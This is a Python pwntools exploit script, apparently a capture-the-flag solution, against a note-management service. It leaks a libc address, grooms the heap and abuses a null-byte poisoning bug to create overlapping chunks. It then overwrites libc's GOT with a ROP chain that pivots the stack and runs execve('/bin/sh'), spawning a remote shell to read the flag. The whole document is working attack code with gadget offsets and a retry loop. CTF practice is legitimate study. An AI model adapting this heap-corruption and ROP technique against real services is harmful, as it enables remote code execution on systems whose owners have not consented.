#!/bin/env python3

from pwn import *

#
# INIT
#
libc = ELF(os.path.join(os.path.dirname(__file__), 'glibc/libc.so.6'), False)


#
# UTILS
#
GOT_OFF = libc.dynamic_value_by_tag("DT_PLTGOT")
PLT0 = libc.get_section_by_name(".plt").header.sh_addr
POP_RSP = 0x001bb53b            # pop rsp; ret;
POP_RAX = 0x001284f0            # pop rax; ret;
POP_RDI = 0x001bc021            # pop rdi; ret;
POP_RSI = 0x001bb317            # pop rsi; ret;
POP_RDX_POP_RBX = 0x00175548    # pop rdx; pop rbx; ret;
SYSCALL = 0x00177e81            # syscall;

#
# FUNCTIONS
#
def add(size, data = b"*"*0x10, title = b"T"*0x10):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Title: ", title)
    io.sendafter(b"Data: ", data)

def edit(idx, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Data: ", data)

def delete(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())

def merge(idx1, idx2):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"index: ", str(idx1).encode())
    io.sendlineafter(b"index: ", str(idx2).encode())

def consolidate():
    payload = b"0" * 0x1000 + b"9"
    io.sendlineafter(b"> ", payload)

#
# EXPLOIT
#
def exploit(HOST, PORT):
    global io

    while True:
        io = remote(HOST, PORT)

        # Get libc leak
        io.sendlineafter(b"> ", b"+")
        io.recvuntil(b"choice: ")
        libc.address = int(io.recvline().strip()) - 0x80057

        #
        # HEAP FENG-SHUI
        #

        # Add chunks to prepare metadata space (idx: 0, 1, 2)
        for i in range(3):
            add(0x418, f"CHUNK{i}".encode(), f"META_CHUNK{i}".encode())

        delete(0)
        add(0x428, b"EXTRA_BARRIER", b"META_EXTRA_BARRIER") # idx: 0
        add(0x448, b"FAKE", b"META_FAKE")                   # idx: 3

        # Vuln chunk, it will trigger the NULL poison
        # and provide the target metadata for arbitrary write
        add(0x428, b"V"*0x228, b"META_VULN")                # idx: 4

        # Create space for metadata chunks
        delete(1)
        # Allocate victim (victim must have size >= 0x500 to not go in tcache)
        add(0x4f8, b"VICTIM", b"META_VICTIM")               # idx: 1

        # Allocate chunk A
        add(0x438, b"A"*0x10, b"META_CHUNK_A")              # idx: 5
        # Creating more space
        delete(2)
        # Allocate barrier
        add(0x428, b"BARRIER_1", b"META_BARRIER_1")         # idx: 2
        # Allocate chunk B and barrier
        add(0x458, b"B"*0x10, b"META_CHUNK_B")              # idx: 6
        add(0x428, b"BARRIER_2", b"META_BARRIER_2")         # idx: 7

        #
        # NULL poisoning
        #

        # Free A, B and FAKE
        delete(5)
        delete(6)
        delete(3)

        # Consolidation
        consolidate()

        # Reclaim FAKE CHUNK which now have valid pointers to bypass unlink
        payload = p64(0) + p64(0xc91)               # Fake size 0xc80 (0x450 - 0x10 + 0x420 * 2)
        add(0x448, payload, b"META_FAKE")           # idx: 3

        # Reclaim CHUNK B and manipulate fd pointer to fake chunk
        payload = p16(0xcf90)
        add(0x458, payload, b"META_CHUNK_B")        # idx: 5

        # Reclaim CHUNK A
        add(0x438, b"A"*0x10, b"META_CHUNK_A")      # idx: 6
        # Free extra barrier so that it will be chunk A bk ptr
        delete(0)
        # Free CHUNK A to have a heap pointer in mchunk->bk
        delete(6)

        # Reclaim CHUNK A and manipulate bk pointer to point to fake chunk
        payload = p64(0) + p16(0xcf90)
        add(0x438, payload, b"META_CHUNK_A")        # idx: 0

        # Now we have a layout which is suitable to bypass every check

        # Reclaim extra barrier chunk with data to be merged
        add(0x428, b"V"*0x200, b"META_MERGE")       # idx: 6
        # Merge it with vuln to trigger the NULL poisoning
        merge(4, 6)

        # Set prev_size on victim
        payload = b"VULN".ljust(0x420, b"\0")
        payload += p64(0xc90)                       # Fake size
        edit(4, payload)

        # Free victim to obtain a overlapping chunk
        delete(1)
        try:
            res = io.recvline()
            if b"corrupt" in res:
                io.close()
                continue
            break
        except:
            io.close()

    # Reclaim extra chunks that are in unsorted bins list
    add(0x418, b"FILLING", b"META_FILLING")         # idx: 1

    # ROP chain on GOT@libc
    # Overwrite page->data pointer to get arbitrary write
    payload = b"+" * 0x438
    payload += p64(0x421)                           # size for page chunk
    payload += p64(0xdead)                          # page->size
    payload += p64(libc.address + GOT_OFF)          # page->data
    add(0x500, payload, b"META_OVERWRITE")          # idx: 6
    # Vuln now points to GOT@libc
    payload = p64(0)
    payload += p64(libc.address + GOT_OFF + 0x100)  # Address of our ROP chain
    payload += p64(libc.address + POP_RSP)          # Stack pivot first gadget
    payload += p64(libc.address + PLT0) * 0x1d      # Fill GOT with magic gadget
    # ROP chain starts here
    payload += p64(libc.address + POP_RDI)
    payload += p64(libc.search(b"/bin/sh").__next__())
    payload += p64(libc.address + POP_RSI)
    payload += p64(0)
    payload += p64(libc.address + POP_RDX_POP_RBX)
    payload += p64(0) * 2
    payload += p64(libc.address + POP_RAX)
    payload += p64(0x3b)                            # Execve syscall
    payload += p64(libc.address + SYSCALL)
    edit(4, payload)
    io.sendline(b"cat flag")
    flag = io.recvline().strip().decode()
    io.close()
    return flag
